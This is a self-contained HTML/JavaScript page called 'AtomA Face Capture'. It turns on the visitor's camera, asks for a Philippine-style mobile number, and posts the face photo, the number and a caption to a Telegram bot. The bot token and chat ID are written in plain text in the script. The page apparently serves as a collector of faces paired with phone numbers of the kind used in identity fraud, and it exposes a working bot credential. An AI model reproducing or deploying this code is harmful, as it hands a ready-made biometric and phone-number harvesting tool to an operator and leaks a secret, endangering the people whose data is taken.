<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>AtomA | Face Capture to Telegram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(165deg, #7EC8E0 0%, #B8E1F0 30%, #FDE08B 70%, #FDD97A 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 48px;
            padding: 30px 25px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255,255,255,0.5);
        }
        h1 { font-size: 1.8rem; margin-bottom: 8px; color: #1a2a3a; }
        .subtitle { font-size: 0.85rem; color: #d46b5e; margin-bottom: 20px; }
        .camera-circle {
            width: 240px;
            height: 240px;
            margin: 0 auto 20px;
            border-radius: 50%;
            overflow: hidden;
            border: 4px solid #FFD700;
            background: #000;
            position: relative;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        .green-edge {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            pointer-events: none;
            box-shadow: inset 0 0 20px 5px rgba(0,255,0,0.8);
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 5;
        }
        .green-edge.active { opacity: 1; animation: pulse 0.8s ease-out; }
        @keyframes pulse {
            0% { box-shadow: inset 0 0 0 0 rgba(0,255,0,0.8); }
            100% { box-shadow: inset 0 0 30px 8px rgba(0,255,0,0.9); }
        }
        input {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: 1.5px solid #f0e0c8;
            border-radius: 60px;
            margin-bottom: 15px;
            text-align: center;
            font-weight: 500;
        }
        button {
            background: #1a1a1a;
            color: #FDD97A;
            border: 2px solid #FDD97A;
            padding: 14px 24px;
            border-radius: 60px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin: 5px 0;
        }
        button:active { transform: scale(0.98); }
        .status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 60px;
            font-size: 13px;
            font-weight: 500;
        }
        .success { background: #d4edda; color: #155724; border-left: 4px solid #28a745; }
        .error { background: #f8d7da; color: #721c24; border-left: 4px solid #dc3545; }
        .info { background: #d1ecf1; color: #0c5460; border-left: 4px solid #17a2b8; }
        .logs {
            margin-top: 20px;
            text-align: left;
            background: #f8f9fa;
            padding: 12px;
            border-radius: 20px;
            font-size: 11px;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
        }
        .logs p { margin: 5px 0; padding: 4px; border-bottom: 1px solid #eee; }
    </style>
</head>
<body>
<div class="container">
    <h1>😊 Face Capture</h1>
    <div class="subtitle">Save face photo to Telegram</div>
    
    <div class="camera-circle">
        <video id="video" autoplay playsinline></video>
        <div class="green-edge" id="greenEdge"></div>
    </div>
    
    <input type="tel" id="phoneNumber" maxlength="10" placeholder="Enter 10-digit number (start with 9)">
    
    <button id="captureBtn">📸 CAPTURE & SEND TO TELEGRAM</button>
    
    <div id="status" class="status info">Ready. Position your face in the circle.</div>
    
    <div class="logs">
        <strong>📋 Activity Log:</strong>
        <div id="logs"></div>
    </div>
</div>

<script>
    // ============================================
    // TELEGRAM BOT CONFIGURATION
    // ============================================
    const TELEGRAM_BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    const TELEGRAM_CHAT_ID = "7298607329";
    
    let videoStream = null;
    let isCameraReady = false;
    
    const video = document.getElementById('video');
    const phoneInput = document.getElementById('phoneNumber');
    const captureBtn = document.getElementById('captureBtn');
    const statusDiv = document.getElementById('status');
    const logsDiv = document.getElementById('logs');
    const greenEdge = document.getElementById('greenEdge');
    
    function addLog(message, type = 'info') {
        const logEntry = document.createElement('p');
        const time = new Date().toLocaleTimeString();
        logEntry.innerHTML = `<span style="color:#888">[${time}]</span> ${message}`;
        logsDiv.appendChild(logEntry);
        logsDiv.scrollTop = logsDiv.scrollHeight;
        console.log(message);
        statusDiv.textContent = message;
        statusDiv.className = `status ${type}`;
    }
    
    // START CAMERA
    async function startCamera() {
        addLog("📷 Starting camera...", "info");
        try {
            if (videoStream) videoStream.getTracks().forEach(t => t.stop());
            
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: "user",
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            });
            
            videoStream = stream;
            video.srcObject = stream;
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            await new Promise(r => setTimeout(r, 500));
            
            isCameraReady = true;
            addLog(`✅ Camera ready! (${video.videoWidth}x${video.videoHeight})`, "success");
            return true;
        } catch (err) {
            addLog("❌ Camera error: " + err.message, "error");
            isCameraReady = false;
            return false;
        }
    }
    
    // CAPTURE PHOTO AND SEND TO TELEGRAM
    async function captureAndSendToTelegram() {
        if (!isCameraReady) {
            addLog("❌ Camera not ready. Please wait.", "error");
            return;
        }
        
        const phoneNumber = phoneInput.value.trim();
        if (!phoneNumber || phoneNumber.length !== 10 || phoneNumber[0] !== '9') {
            addLog("❌ Invalid phone number! Must be 10 digits starting with 9", "error");
            return;
        }
        
        addLog(`📸 Capturing photo for ${phoneNumber}...`, "info");
        
        // Show green edge effect
        greenEdge.classList.add('active');
        setTimeout(() => greenEdge.classList.remove('active'), 800);
        
        try {
            // Create canvas from video
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            if (canvas.width === 0 || canvas.height === 0) {
                addLog("❌ Invalid video dimensions", "error");
                return;
            }
            
            // Draw video to canvas (with mirror effect)
            const ctx = canvas.getContext('2d');
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
            ctx.restore();
            
            addLog("📸 Converting to JPEG...", "info");
            
            // Convert to JPEG blob
            const blob = await new Promise((resolve) => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
            
            if (!blob || blob.size < 1000) {
                addLog("❌ Failed to capture image", "error");
                return;
            }
            
            addLog(`📸 Image size: ${(blob.size / 1024).toFixed(1)} KB`, "success");
            
            // Create FormData for Telegram
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, `face_${phoneNumber}_${Date.now()}.jpg`);
            formData.append('caption', `🔐 New Face Capture\n📱 Phone: +63${phoneNumber}\n⏰ Time: ${new Date().toLocaleString()}\n📍 Source: AtomA Web App`);
            
            addLog("📤 Sending to Telegram...", "info");
            
            // Send to Telegram Bot API
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (result.ok) {
                addLog("✅ PHOTO SENT TO TELEGRAM!", "success");
                addLog(`📸 File ID: ${result.result.photo[0].file_id}`, "success");
                addLog(`📱 Check your Telegram chat (ID: ${TELEGRAM_CHAT_ID})`, "success");
                
                // Also send a text message with details
                const textMessage = `✅ *FACE CAPTURE SUCCESSFUL!*\n\n📱 *Phone:* +63${phoneNumber}\n⏰ *Time:* ${new Date().toLocaleString()}\n📸 *Image Size:* ${(blob.size / 1024).toFixed(1)} KB\n🌐 *Source:* AtomA Face Recognition`;
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textMessage,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Save to localStorage
                const capturedFaces = JSON.parse(localStorage.getItem('capturedFaces') || '[]');
                capturedFaces.push({
                    phoneNumber: phoneNumber,
                    timestamp: new Date().toISOString(),
                    imageSize: blob.size
                });
                localStorage.setItem('capturedFaces', JSON.stringify(capturedFaces));
                
            } else {
                addLog(`❌ Telegram error: ${result.description}`, "error");
            }
            
        } catch (error) {
            addLog(`❌ Error: ${error.message}`, "error");
            console.error(error);
        }
    }
    
    // CAPTURE AND SAVE (for testing without Telegram)
    async function captureAndDownload() {
        if (!isCameraReady) {
            addLog("❌ Camera not ready.", "error");
            return;
        }
        
        const phoneNumber = phoneInput.value.trim();
        if (!phoneNumber || phoneNumber.length !== 10 || phoneNumber[0] !== '9') {
            addLog("❌ Invalid phone number", "error");
            return;
        }
        
        addLog(`📸 Capturing photo...`, "info");
        
        greenEdge.classList.add('active');
        setTimeout(() => greenEdge.classList.remove('active'), 800);
        
        try {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
            ctx.restore();
            
            // Download as file
            canvas.toBlob((blob) => {
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `face_${phoneNumber}_${Date.now()}.jpg`;
                a.click();
                URL.revokeObjectURL(url);
                addLog(`✅ Photo downloaded! Check your downloads folder.`, "success");
            }, 'image/jpeg', 0.9);
            
        } catch (error) {
            addLog(`❌ Error: ${error.message}`, "error");
        }
    }
    
    // Event listeners
    captureBtn.addEventListener('click', captureAndSendToTelegram);
    
    // Add download option on long press (for mobile)
    let pressTimer;
    captureBtn.addEventListener('touchstart', () => {
        pressTimer = setTimeout(() => {
            captureAndDownload();
            addLog("💾 Downloading photo as backup...", "info");
        }, 500);
    });
    captureBtn.addEventListener('touchend', () => {
        clearTimeout(pressTimer);
    });
    
    // Phone validation
    phoneInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length > 10) val = val.slice(0, 10);
        e.target.value = val;
    });
    
    // Start camera
    startCamera();
    
    addLog("🚀 Ready! Position your face in the circle.", "info");
    addLog("📸 Click CAPTURE to send photo to Telegram", "info");
    addLog(`🤖 Telegram Chat ID: ${TELEGRAM_CHAT_ID}`, "info");
</script>
</body>
</html>
